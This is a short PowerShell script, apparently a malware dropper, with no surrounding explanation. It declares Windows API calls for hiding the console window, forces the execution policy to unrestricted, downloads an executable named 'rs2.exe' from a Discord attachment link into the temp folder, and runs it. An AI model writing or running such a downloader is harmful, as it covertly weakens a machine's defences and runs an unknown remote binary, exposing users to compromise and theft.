#Hide-Powershell
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("kernel32.dll", ExactSpelling = true)]
    public static extern IntPtr GetConsoleWindow();
}
"@

 
   Set-ExecutionPolicy unrestricted -Force;
   Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/1258904556398575775/1269432329000980613/rs2.exe?ex=66b00a7c&is=66aeb8fc&hm=e549af8175dc96c9f2c86e9c50eb2701e2890fc2c0d479750ef14902a54355d5&" -OutFile "$env:temp\rs2.exe"; powershell "$env:temp\rs2.exe";
    
